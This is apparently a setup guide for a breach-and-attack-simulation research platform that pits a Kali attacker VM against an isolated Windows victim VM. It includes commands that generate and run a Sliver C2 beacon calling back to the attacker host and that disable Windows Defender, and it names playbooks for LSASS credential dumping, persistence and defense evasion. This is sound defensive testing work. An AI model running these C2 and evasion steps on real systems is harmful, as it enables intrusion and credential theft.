# BAS Platform – Developer Setup Guide
# A Complete Onboarding Reference for New Maintainers

---

## Table of Contents

1. [Prerequisites](#1-prerequisites)
2. [Lab Network Topology](#2-lab-network-topology)
3. [Kali Linux Setup](#3-kali-linux-setup)
4. [Cloning & Installing the Platform](#4-cloning--installing-the-platform)
5. [Configuring the Platform](#5-configuring-the-platform)
6. [Windows Victim VM Setup](#6-windows-victim-vm-setup)
7. [Sliver C2 Setup](#7-sliver-c2-setup)
8. [Running the Platform](#8-running-the-platform)
9. [Using the Web UI](#9-using-the-web-ui)
10. [Running Playbooks](#10-running-playbooks)
11. [Troubleshooting](#11-troubleshooting)
12. [Architecture Notes for Developers](#12-architecture-notes-for-developers)

---

## 1. Prerequisites

Before starting, ensure you have:

| Requirement | Version | Notes |
|-------------|---------|-------|
| VirtualBox | 7.0+ | Hypervisor for running both VMs |
| Kali Linux VM | 2024+ | Platform host (attacker machine) |
| Windows VM | 10 or 11 | Victim machine (target) |
| Python | 3.10+ | Already on Kali |
| RAM | 8GB+ | 2GB Kali + 4GB Windows minimum |
| Disk | 40GB+ | VMs + Go/Sliver runtime |

---

## 2. Lab Network Topology

The platform uses an **isolated Host-Only network** in VirtualBox. No internet traffic should flow through the victim VM during testing.

```
┌───────────────┐           ┌───────────────────┐
│  Kali Linux   │           │   Windows 10/11   │
│  (Attacker)   │◄─────────►│    (Victim VM)    │
│               │  Host-Only│                   │
│ 192.168.56.X  │  Network  │  192.168.56.Y     │
└───────────────┘           └───────────────────┘
        │
        │  (BAS Platform API runs here)
        │  http://localhost:8000
```

### VirtualBox Network Setup

1. Open VirtualBox → **File → Host Network Manager**
2. Create a new Host-Only adapter (e.g., `vboxnet0`) with:
   - **IPv4**: `192.168.56.1`
   - **Mask**: `255.255.255.0`
   - DHCP: Enabled (range `192.168.56.100 – 192.168.56.200`)
3. Assign this adapter to **both** VMs under:
   - VM Settings → Network → Adapter 2 → **Host-Only Adapter** → `vboxnet0`

---

## 3. Kali Linux Setup

### 3.1 System Update

```bash
sudo apt-get update && sudo apt-get upgrade -y
```

### 3.2 Required System Packages

```bash
sudo apt-get install -y \
  python3 python3-venv python3-pip python3-dev \
  curl wget git \
  powershell \
  build-essential
```

> **Note on PowerShell:** On Kali, install via the Microsoft apt repo:
> ```bash
> wget -q "https://packages.microsoft.com/config/debian/$(lsb_release -rs)/packages-microsoft-prod.deb"
> sudo dpkg -i packages-microsoft-prod.deb
> sudo apt-get update && sudo apt-get install -y powershell
> ```

### 3.3 Verify Installation

```bash
python3 --version       # Should show 3.10+
pwsh --version          # Should show PowerShell 7.x
git --version           # Should show git 2.x
```

---

## 4. Cloning & Installing the Platform

### 4.1 Clone the Repository

```bash
git clone https://github.com/YOUR_USERNAME/bas_platform.git
cd bas_platform
```

### 4.2 Run the Setup Script

The `setup.sh` script handles everything:

```bash
sudo bash setup.sh
```

This script will:
- Install system dependencies (Python, PowerShell, Sliver)
- Create a Python virtual environment in `venv/`
- Install all Python packages from `requirements.txt`
- Create the `logs/` and `data/` directories
- Copy `.env.example` to `.env` if not already present

### 4.3 Manual Installation (if setup.sh fails)

```bash
# Create and activate virtual environment
python3 -m venv venv
source venv/bin/activate

# Install Python dependencies
pip install --upgrade pip
pip install -r requirements.txt

# Create required directories
mkdir -p logs data attacks/modules
```

---

## 5. Configuring the Platform

### 5.1 Edit the Environment File

```bash
cp .env.example .env
nano .env
```

### 5.2 Key Settings to Configure

```env
# Victim VM IP (your Windows VM's IP on vboxnet0)
ALLOWED_TARGETS=192.168.56.102

# Credentials for WinRM (Windows Remote Management)
VICTIM_USERNAME=Administrator
VICTIM_PASSWORD=YourWindowsPassword

# Safety — set to true only when ready for live attacks
LIVE_EXECUTION_ENABLED=false

# Sliver C2 (leave default unless changed during Sliver setup)
SLIVER_SERVER_HOST=127.0.0.1
SLIVER_SERVER_PORT=31337
```

> ⚠️ **Never commit `.env` to git.** It is in `.gitignore`.

---

## 6. Windows Victim VM Setup

All commands below must be run in **PowerShell as Administrator** on the Windows VM.

### 6.1 Enable PowerShell Remoting (WinRM)

```powershell
# Enable WinRM service
Enable-PSRemoting -Force

# Allow connections from the Kali host
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.56.1" -Force

# Ensure WinRM starts on boot
Set-Service WinRM -StartupType Automatic
Start-Service WinRM
```

### 6.2 Enable Verbose Windows Event Logging

For telemetry collection to work, audit policies must be enabled:

```powershell
# Enable process creation logging (Event ID 4688)
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Enable PowerShell script block logging
$regPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 1

# Enable module logging
$regPath2 = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
New-Item -Path $regPath2 -Force | Out-Null
Set-ItemProperty -Path $regPath2 -Name "EnableModuleLogging" -Value 1
```

### 6.3 Allow WinRM Through Firewall

```powershell
netsh advfirewall firewall add rule `
  name="WinRM-HTTP" `
  dir=in `
  action=allow `
  protocol=TCP `
  localport=5985
```

### 6.4 Verify WinRM from Kali

On the Kali machine:
```bash
# Test WinRM connectivity
crackmapexec winrm 192.168.56.102 -u Administrator -p 'YourPassword'
# Should show: [+] 192.168.56.102:5985 WINRM (Pwn3d!)
```

### 6.5 Important: Disable Windows Defender for Testing

> ⚠️ Only in isolated lab — **never on real systems**

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### 6.6 Take a Clean Snapshot

After setup, take a VirtualBox snapshot called `"clean-state"`. Restore to this snapshot before each testing session.

---

## 7. Sliver C2 Setup

Sliver is an open-source C2 framework by BishopFox.

### 7.1 Install Sliver (on Kali)

```bash
sudo bash setup_sliver.sh
# OR manually:
curl https://sliver.sh/install | sudo bash
sudo systemctl enable sliver
sudo systemctl start sliver
```

### 7.2 Create an Operator Config

```bash
sudo sliver-server operator --name bas_operator --lhost localhost --save ~/.sliver-client/configs/
```

### 7.3 Verify Sliver is Running

```bash
systemctl status sliver
# Should show: active (running)

# Connect as operator
sliver-client
> help     # shows available commands
> jobs     # shows active listeners
```

### 7.4 Generate and Deploy the Beacon

The platform's `setup_sliver.sh` handles beacon generation. To do it manually:

```bash
# Inside sliver-client
sliver > generate beacon \
  --http 192.168.56.1:8443 \
  --os windows \
  --arch amd64 \
  --save /tmp/beacon.exe

# Start an HTTP listener
sliver > http --lport 8443
```

Transfer `beacon.exe` to the victim VM and execute it:
```powershell
# On victim VM (PowerShell)
.\beacon.exe
```

### 7.5 Verify Beacon Check-In

```bash
# In sliver-client
sliver > beacons   # Should show your victim VM
```

---

## 8. Running the Platform

### 8.1 Launch the API

```bash
cd bas_platform
./run.sh
```

The script will:
1. Activate the virtual environment
2. Check and start the Sliver HTTP listener on port 8443
3. Start the FastAPI server on port 8000

### 8.2 Verify the API is Running

```bash
# Health check
curl http://localhost:8000/health

# Safety status
curl http://localhost:8000/api/v1/safety/status

# List available attack techniques
curl http://localhost:8000/api/v1/attacks/techniques | python3 -m json.tool
```

### 8.3 Start Telemetry Collection

```bash
curl -X POST "http://localhost:8000/api/v1/telemetry/start/192.168.56.102?interval=5"
```

### 8.4 Execute an Attack (Example)

```bash
curl -X POST "http://localhost:8000/api/v1/attacks/execute" \
  -H "Content-Type: application/json" \
  -d '{"technique_id": "T1087", "target_ip": "192.168.56.102"}'
```

### 8.5 Safety Levels

Set the appropriate safety level before testing:

```bash
# Simulation (no real execution — good for first test)
curl -X POST "http://localhost:8000/api/v1/safety/level/simulation"

# Controlled (safe, non-destructive attacks)
curl -X POST "http://localhost:8000/api/v1/safety/level/controlled"

# Full (requires LIVE_EXECUTION_ENABLED=true in .env)
curl -X POST "http://localhost:8000/api/v1/safety/level/full"
```

### 8.6 Emergency Stop

```bash
# Trigger kill switch — stops all attacks immediately
curl -X POST "http://localhost:8000/api/v1/safety/kill-switch"

# Reset kill switch
curl -X DELETE "http://localhost:8000/api/v1/safety/kill-switch"
```

---

## 9. Using the Web UI

The web UI is a React + Vite application in the `web-ui/` directory.

### 9.1 Development Mode

```bash
cd web-ui
npm install
npm run dev
# Opens at http://localhost:5173
```

### 9.2 Production Build

```bash
cd web-ui
npm run build
# Outputs to web-ui/dist/
```

The web UI provides:
- Live telemetry dashboard (CPU, memory, network)
- Attack execution control panel
- Sliver C2 implant viewer
- Safety level controls
- Attack result timeline

---

## 10. Running Playbooks

Playbooks are bash scripts that chain multiple attack techniques via the API. All playbooks are in `playbooks/`.

### 10.1 Before Running Any Playbook

```bash
# 1. Restore victim VM to clean snapshot
# 2. Confirm API is running
curl http://localhost:8000/health

# 3. Start telemetry
curl -X POST "http://localhost:8000/api/v1/telemetry/start/192.168.56.102"

# 4. Set safety level
curl -X POST "http://localhost:8000/api/v1/safety/level/controlled"
```

### 10.2 Discovery Phase

```bash
bash playbooks/discovery_phase.sh 192.168.56.102
```
Runs: Account Discovery (T1087), Process Discovery (T1057), Network Config Discovery (T1016), File Discovery (T1083)

### 10.3 Credential Access

```bash
bash playbooks/credential_access.sh 192.168.56.102
```
Runs: LSASS Memory safe dump (T1003.001)

### 10.4 Persistence

```bash
bash playbooks/persistence_phase.sh 192.168.56.102
```
Runs: Scheduled Task Creation (T1053.005)

### 10.5 Privilege Escalation

```bash
bash playbooks/privilege_escalation.sh 192.168.56.102
```

### 10.6 Lateral Movement (WinRM)

```bash
bash playbooks/lateral_movement.sh 192.168.56.102
```

### 10.7 Lateral Movement (Sliver C2)

This is the most complete playbook — 5 phases:
1. **Phase 1**: C2 Beacon validation
2. **Phase 2**: System reconnaissance via C2
3. **Phase 3**: Credential extraction via C2
4. **Phase 4**: Lateral movement via C2
5. **Phase 5**: BAS API result logging

```bash
# Requires Sliver beacon active on victim
bash playbooks/lateral_movement_sliver.sh
```

### 10.8 Defense Evasion (Adaptive)

```bash
bash playbooks/defense_evasion_adaptive.sh 192.168.56.102
```
Uses a primary/fallback mechanism — if primary technique is detected, automatically pivots to fallback.

### 10.9 Ransomware Simulation

```bash
bash playbooks/ransomware_simulation.sh 192.168.56.102
```
> ⚠️ This generates test files and simulates encryption behavior. No real encryption occurs. Always restore from snapshot after.

---

## 11. Troubleshooting

### 11.1 WinRM Connection Refused

**Symptom:** `ConnectionRefusedError: 192.168.56.102:5985`

```bash
# On Windows VM — check WinRM is running
Get-Service WinRM
Start-Service WinRM

# Check network connectivity
ping 192.168.56.1     # Ping Kali from Windows

# Re-run remoting setup
Enable-PSRemoting -Force -SkipNetworkProfileCheck
```

### 11.2 Sliver gRPC Connection Fails

**Symptom:** `Error: context deadline exceeded` or `CERTIFICATE_VERIFY_FAILED`

```bash
# Restart Sliver
sudo systemctl restart sliver
sleep 5

# Run the fix script
sudo bash fix_sliver.sh

# Verify operator config exists
ls ~/.sliver-client/configs/
```

### 11.3 API Won't Start

**Symptom:** `Address already in use :8000`

```bash
sudo lsof -i :8000
sudo kill -9 <PID>
./run.sh
```

### 11.4 Python Dependency Errors

```bash
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt --force-reinstall
```

### 11.5 Beacon Not Checking In

1. Ensure port 8443 is open on Kali: `sudo ufw allow 8443`
2. Verify the Sliver HTTP listener: in `sliver-client`, run `jobs` — look for port 8443
3. Re-execute the beacon on the victim VM
4. Check Sliver logs: `journalctl -u sliver -f`

---

## 12. Architecture Notes for Developers

### 12.1 Core Components

| Component | File | Role |
|-----------|------|------|
| Safety Engine | `core/safety_engine.py` | Kill switch, target validation, health monitor |
| Attack Executor | `core/attack_executor.py` | MITRE technique registry, command execution via WinRM |
| Adaptive Executor | `core/adaptive_executor.py` | Fallback logic for adaptive defense evasion |
| Telemetry Collector | `telemetry/collector.py` | Real-time metrics from victim via WinRM |
| Event Parser | `telemetry/event_parser.py` | Windows Event Log parsing |
| Sliver Client | `c2_integration/sliver_client.py` | gRPC client for Sliver server |
| API | `api/main.py` | FastAPI app with all endpoints |
| Settings | `config/settings.py` | Pydantic-settings env loader |

### 12.2 Adding New Techniques

1. Open `core/attack_executor.py`
2. Add your technique in `_register_builtin_techniques()`
3. Use the `AttackTechnique` dataclass
4. Map it to a MITRE ATT\&CK ID

### 12.3 Adding New Playbooks

1. Create `playbooks/your_playbook.sh`
2. Use `curl` to call the BAS API at `http://localhost:8000`
3. Follow the structure of an existing playbook (e.g., `discovery_phase.sh`)
4. The API handles all safety checks — playbooks just orchestrate technique calls

### 12.4 Environment Variables Reference

| Variable | Default | Description |
|----------|---------|-------------|
| `API_HOST` | `0.0.0.0` | API bind address |
| `API_PORT` | `8000` | API port |
| `LIVE_EXECUTION_ENABLED` | `false` | Master live-fire switch |
| `ALLOWED_TARGETS` | _(empty)_ | Whitelisted victim IPs |
| `VICTIM_USERNAME` | _(none)_ | WinRM username |
| `VICTIM_PASSWORD` | _(none)_ | WinRM password |
| `SLIVER_SERVER_HOST` | `127.0.0.1` | Sliver gRPC host |
| `SLIVER_SERVER_PORT` | `31337` | Sliver gRPC port |
| `HEALTH_THRESHOLD` | `30` | Auto-stop health score |
| `TELEMETRY_INTERVAL` | `5` | Metric collection interval (s) |

---

*This guide was prepared for the next maintainer of this research project. If you encounter issues not covered here, refer to the `README.md`, the FastAPI docs at `http://localhost:8000/docs`, or open an issue on the GitHub repository.*
